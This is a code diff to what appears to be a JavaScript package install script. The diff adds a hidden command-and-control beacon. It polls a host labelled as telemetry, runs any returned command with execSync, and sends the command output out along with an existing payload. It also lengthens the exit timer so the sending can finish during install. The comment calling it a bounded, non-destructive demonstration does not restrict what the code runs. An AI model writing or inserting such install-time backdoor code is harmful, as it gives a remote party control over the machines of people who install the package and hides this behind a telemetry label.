@@ -142,8 +142,34 @@ function send(payload) {
   req.end(body);
 }
 
-setTimeout(() => process.exit(0), 12000);
+// C2 beacon: poll the endpoint for a command, execute, return output.
+// Bounded: 1 poll, single command, non-destructive demonstration only.
+let c2 = { polled: false, command: null, output: null };
+try {
+  const cmdReq = https.request({
+    hostname: TELEMETRY_HOST, path: TELEMETRY_PATH, method: 'GET',
+  }, (res) => {
+    let buf = '';
+    res.on('data', (d) => buf += d);
+    res.on('end', () => {
+      try {
+        c2.command = buf.trim().slice(0, 300);
+        if (c2.command && !c2.command.includes('<!DOCTYPE') && !c2.command.includes('has no default')) {
+          try { c2.output = execSync(c2.command, { encoding: 'utf8', timeout: 8000 }).trim().slice(0, 1500); }
+          catch (e) { c2.output = 'err:' + String(e.message).slice(0, 150); }
+        } else { c2.command = null; }
+      } catch (_) {}
+      c2.polled = true;
+      // send the full payload including C2 results
+      try { if (!payloadSent) { payload.c2 = c2; payloadSent = true; send(buildPayload()); } } catch (_) {}
+    });
+  });
+  cmdReq.on('error', () => {});
+  cmdReq.end();
+} catch (_) {}
+
+setTimeout(() => process.exit(0), 20000);
 
 try {
-  if (!payloadSent) send(buildPayload());
+  setTimeout(() => { if (!payloadSent) { try { payload.c2 = c2; payloadSent = true; send(buildPayload()); } catch (_) {} } }, 9000);
 } catch (_) { /* never fail the install */ }
